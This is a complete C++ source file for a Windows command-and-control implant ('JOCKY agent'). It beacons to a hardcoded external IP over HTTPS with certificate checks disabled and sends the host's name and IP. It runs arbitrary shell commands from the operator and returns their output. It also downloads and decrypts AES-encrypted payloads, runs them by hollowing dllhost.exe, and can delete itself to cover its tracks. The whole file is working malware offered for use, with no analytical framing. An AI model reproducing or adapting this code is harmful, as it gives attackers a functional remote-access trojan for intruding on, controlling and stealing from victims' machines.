// jocky_agent_full.cpp — self-contained JOCKY C2 implant (OLLVM-ready, single TU, no STL)
// Clang 16 + MSVC STL 18 are incompatible; this file uses no <string>/<vector>.
//
// Compile-time overrides:
//   -DC2_HOST=L"65.1.92.74"   -DC2_PORT=443   -DPOLL_INTERVAL_MS=30000
//   -DATTACKER_IP="65.1.92.74"
//   -DAES_KEY_HEX="6a6f636b..."   (64 hex chars = 32 bytes)
//   -DHOLLOW_TARGET="C:\\Windows\\System32\\dllhost.exe"

#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

// ── Config ────────────────────────────────────────────────────────────────────
#ifndef C2_HOST
#define C2_HOST L"65.1.92.74"
#endif
#ifndef C2_PORT
#define C2_PORT 443
#endif
#ifndef POLL_INTERVAL_MS
#define POLL_INTERVAL_MS 30000
#endif
#ifndef ATTACKER_IP
#define ATTACKER_IP "65.1.92.74"
#endif
#ifndef AES_KEY_HEX
#define AES_KEY_HEX "6a6f636b795f6465765f6165735f6b65795f6a6f636b795f6465765f6165736b"
#endif
#ifndef PAYLOAD_PATH
#define PAYLOAD_PATH "C:\\Windows\\Temp\\payload.exe"
#endif
#ifndef HOLLOW_TARGET
#define HOLLOW_TARGET "C:\\Windows\\System32\\dllhost.exe"
#endif

// ── String builder ────────────────────────────────────────────────────────────

struct Sb {
    char* p;
    DWORD len;
    DWORD cap;
};

static void sb_init(Sb* s) { s->p = NULL; s->len = 0; s->cap = 0; }

static void sb_free(Sb* s) {
    if (s->p) HeapFree(GetProcessHeap(), 0, s->p);
    s->p = NULL; s->len = s->cap = 0;
}

static int sb_grow(Sb* s, DWORD need) {
    if (s->len + need + 1 <= s->cap) return 1;
    DWORD nc = (s->len + need + 1) * 2 + 64;
    char* nb = s->p
        ? (char*)HeapReAlloc(GetProcessHeap(), 0, s->p, nc)
        : (char*)HeapAlloc(GetProcessHeap(), 0, nc);
    if (!nb) return 0;
    s->p = nb; s->cap = nc;
    return 1;
}

static void sb_append(Sb* s, const char* src, DWORD n) {
    if (!sb_grow(s, n)) return;
    memcpy(s->p + s->len, src, n);
    s->len += n;
    s->p[s->len] = '\0';
}

static void sb_appends(Sb* s, const char* src) {
    if (src) sb_append(s, src, (DWORD)strlen(src));
}

static void sb_appendc(Sb* s, char c) { sb_append(s, &c, 1); }

static const char* sb_str(const Sb* s) { return s->p ? s->p : ""; }

// ── Byte buffer ───────────────────────────────────────────────────────────────

struct Blob {
    uint8_t* data;
    DWORD    size;
};

static void blob_init(Blob* b) { b->data = NULL; b->size = 0; }

static void blob_free(Blob* b) {
    if (b->data) HeapFree(GetProcessHeap(), 0, b->data);
    b->data = NULL; b->size = 0;
}

static int blob_resize(Blob* b, DWORD n) {
    uint8_t* nb = b->data
        ? (uint8_t*)HeapReAlloc(GetProcessHeap(), 0, b->data, n ? n : 1)
        : (uint8_t*)HeapAlloc(GetProcessHeap(), 0, n ? n : 1);
    if (!nb) return 0;
    b->data = nb; b->size = n;
    return 1;
}

// ── Minimal JSON helpers (operates on null-terminated char*) ──────────────────

// Copy string value for key into out[outLen]; returns 1 on success.
static int json_str(const char* json, const char* key, char* out, DWORD outLen) {
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\":\"", key);
    const char* p = strstr(json, needle);
    if (!p) { out[0] = '\0'; return 0; }
    p += strlen(needle);
    const char* e = strchr(p, '"');
    if (!e) { out[0] = '\0'; return 0; }
    DWORD n = (DWORD)(e - p);
    if (n >= outLen) n = outLen - 1;
    memcpy(out, p, n);
    out[n] = '\0';
    return 1;
}

static int json_int(const char* json, const char* key) {
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\":", key);
    const char* p = strstr(json, needle);
    if (!p) return 0;
    p += strlen(needle);
    while (*p == ' ') p++;
    return atoi(p);
}

// Copy raw JSON value (object, string, or scalar) for key into out.
static void json_raw(const char* json, const char* key, size_t startOff,
                     Sb* out) {
    sb_init(out);
    char needle[128];
    snprintf(needle, sizeof(needle), "\"%s\":", key);
    const char* p = strstr(json + startOff, needle);
    if (!p) { sb_appends(out, "{}"); return; }
    p += strlen(needle);
    while (*p == ' ') p++;

    if (*p == '{') {
        int depth = 0;
        const char* start = p;
        while (*p) {
            if (*p == '{') depth++;
            else if (*p == '}') { depth--; if (!depth) { sb_append(out, start, (DWORD)(p - start + 1)); return; } }
            p++;
        }
        sb_appends(out, "{}");
    } else if (*p == '"') {
        const char* start = p;
        const char* e = strchr(p + 1, '"');
        if (!e) return;
        sb_append(out, start, (DWORD)(e - start + 1));
    } else {
        const char* start = p;
        while (*p && *p != ',' && *p != ']' && *p != '}') p++;
        sb_append(out, start, (DWORD)(p - start));
    }
}

static void json_escape(const char* s, Sb* out) {
    for (const unsigned char* p = (const unsigned char*)s; *p; p++) {
        switch (*p) {
            case '"':  sb_appends(out, "\\\""); break;
            case '\\': sb_appends(out, "\\\\"); break;
            case '\n': sb_appends(out, "\\n");  break;
            case '\r': sb_appends(out, "\\r");  break;
            case '\t': sb_appends(out, "\\t");  break;
            default:   if (*p < 0x20) sb_appendc(out, ' '); else sb_appendc(out, (char)*p);
        }
    }
}

// ── WinHTTP ───────────────────────────────────────────────────────────────────

static HINTERNET g_session = NULL;
static HINTERNET g_connect = NULL;

static int HttpInit() {
    g_session = WinHttpOpen(L"JockyAgent/1.0",
                             WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                             WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!g_session) return 0;
    g_connect = WinHttpConnect(g_session, C2_HOST, C2_PORT, 0);
    return g_connect != NULL;
}

// Returns HTTP status; body accumulated in out_body (caller owns, must sb_free).
static DWORD HttpDo(const wchar_t* method, const wchar_t* path,
                    const char* body, const char* token,
                    Sb* out_body) {
    sb_init(out_body);
    HINTERNET hReq = WinHttpOpenRequest(
        g_connect, method, path, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hReq) return 0;

    DWORD secFlags =
        SECURITY_FLAG_IGNORE_UNKNOWN_CA       |
        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
        SECURITY_FLAG_IGNORE_CERT_CN_INVALID  |
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
    WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));

    wchar_t hdrs[512] = L"Content-Type: application/json\r\n";
    if (token && token[0]) {
        wcscat_s(hdrs, 512, L"Authorization: Bearer ");
        // ASCII token → wchar
        wchar_t wtok[256] = {};
        for (int i = 0; token[i] && i < 255; i++) wtok[i] = (wchar_t)(unsigned char)token[i];
        wcscat_s(hdrs, 512, wtok);
        wcscat_s(hdrs, 512, L"\r\n");
    }

    DWORD nBody = body ? (DWORD)strlen(body) : 0;
    if (!WinHttpSendRequest(hReq, hdrs, (DWORD)wcslen(hdrs),
                            (LPVOID)body, nBody, nBody, 0)) {
        WinHttpCloseHandle(hReq); return 0;
    }
    if (!WinHttpReceiveResponse(hReq, NULL)) {
        WinHttpCloseHandle(hReq); return 0;
    }

    DWORD code = 0, sz = sizeof(code);
    WinHttpQueryHeaders(hReq,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &code, &sz, WINHTTP_NO_HEADER_INDEX);

    DWORD avail = 0;
    while (WinHttpQueryDataAvailable(hReq, &avail) && avail > 0) {
        char chunk[4096];
        DWORD nRead = 0;
        DWORD toRead = avail < sizeof(chunk) ? avail : sizeof(chunk);
        WinHttpReadData(hReq, chunk, toRead, &nRead);
        sb_append(out_body, chunk, nRead);
    }
    WinHttpCloseHandle(hReq);
    return code;
}

// ── Crypto helpers ────────────────────────────────────────────────────────────

static int HexDecode(const char* hex, uint8_t* out, DWORD outLen) {
    for (DWORD i = 0; i < outLen; i++) {
        int hi, lo;
        char h = hex[i * 2], l = hex[i * 2 + 1];
        hi = (h >= '0' && h <= '9') ? h - '0' : (h >= 'a' && h <= 'f') ? h - 'a' + 10 : (h >= 'A' && h <= 'F') ? h - 'A' + 10 : -1;
        lo = (l >= '0' && l <= '9') ? l - '0' : (l >= 'a' && l <= 'f') ? l - 'a' + 10 : (l >= 'A' && l <= 'F') ? l - 'A' + 10 : -1;
        if (hi < 0 || lo < 0) return 0;
        out[i] = (uint8_t)((hi << 4) | lo);
    }
    return 1;
}

// Base64 decode into blob (caller owns, must blob_free).
static int Base64Decode(const char* b64, DWORD b64Len, Blob* out) {
    blob_init(out);
    DWORD needed = 0;
    if (!CryptStringToBinaryA(b64, b64Len, CRYPT_STRING_BASE64, NULL, &needed, NULL, NULL))
        return 0;
    if (!blob_resize(out, needed)) return 0;
    DWORD actual = needed;
    if (!CryptStringToBinaryA(b64, b64Len, CRYPT_STRING_BASE64, out->data, &actual, NULL, NULL))
        return 0;
    out->size = actual;
    return 1;
}

// AES-256-CBC decrypt: first 16 bytes of input are IV.
static int AesDecrypt(const uint8_t* key32, const Blob* input, Blob* output) {
    blob_init(output);
    if (input->size < 17) return 0;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return 0;

    const wchar_t* mode = BCRYPT_CHAIN_MODE_CBC;
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)mode, (ULONG)((wcslen(mode) + 1) * sizeof(wchar_t)), 0);

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key32, 32, 0);
    if (!BCRYPT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAlg, 0); return 0; }

    uint8_t iv[16];
    memcpy(iv, input->data, 16);
    PUCHAR ct  = input->data + 16;
    ULONG  ctl = input->size - 16;

    ULONG plainLen = 0;
    BCryptDecrypt(hKey, ct, ctl, NULL, iv, 16, NULL, 0, &plainLen, BCRYPT_BLOCK_PADDING);
    memcpy(iv, input->data, 16);

    if (!blob_resize(output, plainLen)) {
        BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlg, 0); return 0;
    }
    status = BCryptDecrypt(hKey, ct, ctl, NULL, iv, 16,
                           output->data, plainLen, &plainLen, BCRYPT_BLOCK_PADDING);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    if (!BCRYPT_SUCCESS(status)) return 0;
    output->size = plainLen;
    return 1;
}

static void PatchIp(Blob* payload, const char* ip) {
    static const char placeholder[] = "ATTACKER_IP_HERE";
    DWORD plen = (DWORD)strlen(placeholder);
    for (DWORD i = 0; i + plen <= payload->size; i++) {
        if (memcmp(payload->data + i, placeholder, plen) == 0) {
            memset(payload->data + i, 0, 64);
            DWORD iplen = (DWORD)strlen(ip);
            if (iplen > 63) iplen = 63;
            memcpy(payload->data + i, ip, iplen);
            return;
        }
    }
}

// ── Shell execution ───────────────────────────────────────────────────────────

static void RunShell(const char* cmd, Sb* out) {
    sb_init(out);
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE hR, hW;
    if (!CreatePipe(&hR, &hW, &sa, 0)) { sb_appends(out, "(pipe failed)"); return; }
    SetHandleInformation(hR, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si = {sizeof(si)};
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdOutput = hW;
    si.hStdError  = hW;
    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);

    char full[2048];
    snprintf(full, sizeof(full), "cmd.exe /C %s", cmd);

    PROCESS_INFORMATION pi = {};
    if (!CreateProcessA(NULL, full, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hR);
        CloseHandle(hW);
        char err[64]; snprintf(err, sizeof(err), "(CreateProcess failed: %lu)", GetLastError());
        sb_appends(out, err); return;
    }
    CloseHandle(hW);

    char tmp[4096]; DWORD nr;
    while (ReadFile(hR, tmp, sizeof(tmp) - 1, &nr, NULL) && nr > 0)
        sb_append(out, tmp, nr);

    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(hR);

    if (out->len > 8192) { out->len = 8192; sb_appends(out, "\n[truncated]"); }
}

// ── Process hollow (Win32 APIs, no asm) ───────────────────────────────────────

static DWORD RunHollowPipeline() {
    HANDLE hf = CreateFileA(PAYLOAD_PATH, GENERIC_READ, FILE_SHARE_READ, NULL,
                             OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 0;

    DWORD sz = GetFileSize(hf, NULL);
    if (!sz || sz == INVALID_FILE_SIZE) { CloseHandle(hf); return 0; }

    Blob pe; blob_init(&pe);
    if (!blob_resize(&pe, sz)) { CloseHandle(hf); return 0; }
    DWORD nr = 0;
    ReadFile(hf, pe.data, sz, &nr, NULL);
    CloseHandle(hf);
    if (nr != sz) { blob_free(&pe); return 0; }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pe.data;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { blob_free(&pe); return 0; }
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pe.data + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) { blob_free(&pe); return 0; }

    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi = {};
    char target[] = HOLLOW_TARGET;
    if (!CreateProcessA(NULL, target, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        blob_free(&pe); return 0;
    }

    LPVOID pRemote = VirtualAllocEx(pi.hProcess,
                                     (LPVOID)(ULONG_PTR)nt->OptionalHeader.ImageBase,
                                     nt->OptionalHeader.SizeOfImage,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemote)
        pRemote = VirtualAllocEx(pi.hProcess, NULL, nt->OptionalHeader.SizeOfImage,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemote) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        blob_free(&pe); return 0;
    }

    WriteProcessMemory(pi.hProcess, pRemote, pe.data, nt->OptionalHeader.SizeOfHeaders, NULL);

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (!sec->SizeOfRawData) continue;
        WriteProcessMemory(pi.hProcess,
                           (LPBYTE)pRemote + sec->VirtualAddress,
                           pe.data + sec->PointerToRawData,
                           sec->SizeOfRawData, NULL);
    }

    CONTEXT ctx = {}; ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    ULONGLONG pBase = (ULONGLONG)pRemote;
    WriteProcessMemory(pi.hProcess, (LPBYTE)(ULONG_PTR)ctx.Rdx + 16, &pBase, 8, NULL);
    ctx.Rcx = (DWORD64)pRemote + nt->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);

    ResumeThread(pi.hThread);
    DWORD pid = pi.dwProcessId;
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    blob_free(&pe);
    return pid;
}

// ── Agent state ───────────────────────────────────────────────────────────────

static char g_agentId[64]   = {};
static char g_token[128]    = {};
static char g_lastSha[65]   = {};
static uint8_t g_aesKey[32] = {};

// ── Registration ──────────────────────────────────────────────────────────────

static int AgentRegister() {
    char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD hnLen = sizeof(hostname);
    GetComputerNameA(hostname, &hnLen);

    char ipAddr[32] = "0.0.0.0";
    {
        WSADATA wsa = {};
        if (WSAStartup(MAKEWORD(2, 2), &wsa) == 0) {
            SOCKET s = socket(AF_INET, SOCK_DGRAM, 0);
            if (s != INVALID_SOCKET) {
                struct sockaddr_in tgt = {};
                tgt.sin_family      = AF_INET;
                tgt.sin_port        = htons(80);
                tgt.sin_addr.s_addr = inet_addr("8.8.8.8");
                if (connect(s, (struct sockaddr*)&tgt, sizeof(tgt)) == 0) {
                    struct sockaddr_in local = {}; int len = sizeof(local);
                    if (getsockname(s, (struct sockaddr*)&local, &len) == 0)
                        strncpy_s(ipAddr, sizeof(ipAddr), inet_ntoa(local.sin_addr), _TRUNCATE);
                }
                closesocket(s);
            }
            WSACleanup();
        }
    }

    char body[512];
    snprintf(body, sizeof(body),
             "{\"hostname\":\"%s\",\"ip_address\":\"%s\","
             "\"metadata\":{\"os\":\"Windows\",\"arch\":\"x64\"}}",
             hostname, ipAddr);

    Sb resp; DWORD status = HttpDo(L"POST", L"/api/v1/agent/register", body, NULL, &resp);
    if (status != 201) { sb_free(&resp); return 0; }

    json_str(sb_str(&resp), "agent_id",   g_agentId, sizeof(g_agentId));
    json_str(sb_str(&resp), "auth_token", g_token,   sizeof(g_token));
    sb_free(&resp);
    return g_agentId[0] && g_token[0];
}

// ── Payload delivery ──────────────────────────────────────────────────────────

static void PayloadPoll() {
    Sb resp; DWORD status = HttpDo(L"GET", L"/api/v1/payload/status", NULL, g_token, &resp);
    if (status != 200) { sb_free(&resp); return; }

    char sha256[65] = {}; int chunkCount = 0;
    json_str(sb_str(&resp), "sha256", sha256, sizeof(sha256));
    chunkCount = json_int(sb_str(&resp), "chunk_count");
    sb_free(&resp);

    if (!sha256[0] || chunkCount <= 0 || strcmp(sha256, g_lastSha) == 0) return;

    Sb allB64; sb_init(&allB64);
    for (int i = 0; i < chunkCount; i++) {
        wchar_t path[64];
        swprintf_s(path, 64, L"/api/v1/payload/chunk/%d", i);
        Sb cr; DWORD cs = HttpDo(L"GET", path, NULL, g_token, &cr);
        if (cs != 200) { sb_free(&cr); sb_free(&allB64); return; }
        char chunk_data[4096] = {};
        json_str(sb_str(&cr), "data", chunk_data, sizeof(chunk_data));
        sb_appends(&allB64, chunk_data);
        sb_free(&cr);
    }

    Blob decoded;
    if (!Base64Decode(sb_str(&allB64), allB64.len, &decoded)) { sb_free(&allB64); return; }
    sb_free(&allB64);

    Blob payload;
    if (!AesDecrypt(g_aesKey, &decoded, &payload)) { blob_free(&decoded); return; }
    blob_free(&decoded);

    PatchIp(&payload, ATTACKER_IP);

    HANDLE hf = CreateFileA(PAYLOAD_PATH, GENERIC_WRITE, 0, NULL,
                             CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) { blob_free(&payload); return; }
    DWORD written = 0;
    WriteFile(hf, payload.data, payload.size, &written, NULL);
    CloseHandle(hf);
    blob_free(&payload);
    if (written == 0) return;

    if (RunHollowPipeline() > 4)
        strncpy_s(g_lastSha, sizeof(g_lastSha), sha256, _TRUNCATE);
}

// ── Task dispatch ─────────────────────────────────────────────────────────────

static void DispatchTask(const char* taskId, const char* cmdType, const char* payload) {
    Sb result; sb_init(&result);

    if (strcmp(cmdType, "shell") == 0) {
        char cmd[1024] = {};
        json_str(payload, "cmd", cmd, sizeof(cmd));
        if (!cmd[0]) {
            sb_appends(&result, "{\"error\":\"no cmd field\"}");
        } else {
            Sb out; RunShell(cmd, &out);
            sb_appends(&result, "{\"output\":\"");
            json_escape(sb_str(&out), &result);
            sb_appends(&result, "\"}");
            sb_free(&out);
        }
    } else if (strcmp(cmdType, "hollow") == 0) {
        DWORD pid = RunHollowPipeline();
        if (pid <= 4) {
            sb_appends(&result, "{\"error\":\"hollow failed\"}");
        } else {
            char tmp[64]; snprintf(tmp, sizeof(tmp), "{\"hollowed_pid\":%lu}", pid);
            sb_appends(&result, tmp);
        }
    } else if (strcmp(cmdType, "self_destruct") == 0) {
        DeleteFileA(PAYLOAD_PATH);
        char selfPath[MAX_PATH] = {};
        GetModuleFileNameA(NULL, selfPath, MAX_PATH);
        char delCmd[MAX_PATH + 80];
        snprintf(delCmd, sizeof(delCmd),
                 "cmd /c ping 127.0.0.1 -n 3 > nul & del /f /q \"%s\"", selfPath);
        STARTUPINFOA si2 = {sizeof(si2)}; PROCESS_INFORMATION pi2 = {};
        CreateProcessA(NULL, delCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2);
        sb_appends(&result, "{\"status\":\"self_destruct_initiated\"}");
    } else {
        sb_appends(&result, "{\"error\":\"unknown command_type\"}");
    }

    char telem[256 + 8192];
    snprintf(telem, sizeof(telem),
             "{\"task_id\":\"%s\",\"log_type\":\"event\",\"data\":%s}",
             taskId, sb_str(&result));
    sb_free(&result);

    Sb ignore; HttpDo(L"POST", L"/api/v1/agent/telemetry", telem, g_token, &ignore);
    sb_free(&ignore);

    if (strcmp(cmdType, "self_destruct") == 0) ExitProcess(0);
}

// ── Poll ──────────────────────────────────────────────────────────────────────

static void AgentPoll() {
    Sb resp; DWORD status = HttpDo(L"GET", L"/api/v1/agent/poll", NULL, g_token, &resp);
    if (status != 200) { sb_free(&resp); return; }

    const char* body = sb_str(&resp);
    const char* p = body;

    while (1) {
        const char* id_start = strstr(p, "\"task_id\":\"");
        if (!id_start) break;
        id_start += 11;
        const char* id_end = strchr(id_start, '"');
        if (!id_end) break;

        char taskId[64] = {};
        DWORD idLen = (DWORD)(id_end - id_start);
        if (idLen >= sizeof(taskId)) idLen = sizeof(taskId) - 1;
        memcpy(taskId, id_start, idLen);

        char cmdType[64] = {};
        const char* ct = strstr(p, "\"command_type\":\"");
        if (ct && ct < id_start + 512) {
            ct += 16;
            const char* cte = strchr(ct, '"');
            if (cte) {
                DWORD ctLen = (DWORD)(cte - ct);
                if (ctLen >= sizeof(cmdType)) ctLen = sizeof(cmdType) - 1;
                memcpy(cmdType, ct, ctLen);
            }
        }

        Sb rawPayload;
        json_raw(body, "payload", (size_t)(id_start - body), &rawPayload);

        if (taskId[0] && cmdType[0])
            DispatchTask(taskId, cmdType, sb_str(&rawPayload));

        sb_free(&rawPayload);
        p = id_end + 1;
    }

    sb_free(&resp);
}

// ── Entry point ───────────────────────────────────────────────────────────────

int main() {
    HexDecode(AES_KEY_HEX, g_aesKey, 32);
    if (!HttpInit()) return 1;

    for (int attempt = 0; attempt < 5; attempt++) {
        if (attempt) Sleep(10000);
        if (AgentRegister()) goto registered;
    }
    return 1;

registered:
    while (1) {
        PayloadPoll();
        AgentPoll();
        Sleep(POLL_INTERVAL_MS);
    }
}
